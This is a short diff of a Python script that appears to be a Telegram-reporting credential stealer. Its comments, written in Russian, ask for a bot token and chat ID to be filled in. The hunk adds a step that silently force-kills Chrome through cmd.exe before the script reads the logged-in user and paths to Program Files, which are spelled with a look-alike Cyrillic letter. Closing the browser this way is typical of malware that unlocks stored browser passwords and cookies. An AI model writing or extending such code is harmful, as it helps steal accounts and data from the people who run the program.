@@ -27,6 +27,11 @@ import tempfile
 chat_id = ''#СЮДА CHAT ID
 bot = telebot.TeleBot('')#СЮДА ТОКЕН БОТА
 
+try:
+    subprocess.run(r'c:\windows\system32\cmd.exe /C taskkill /f /im chrome.exe')
+except:
+    pass
+
 user = os.getlogin()
 dis = r'C:\Program Filеs'
 dis2 = 'C:/Program Filеs'
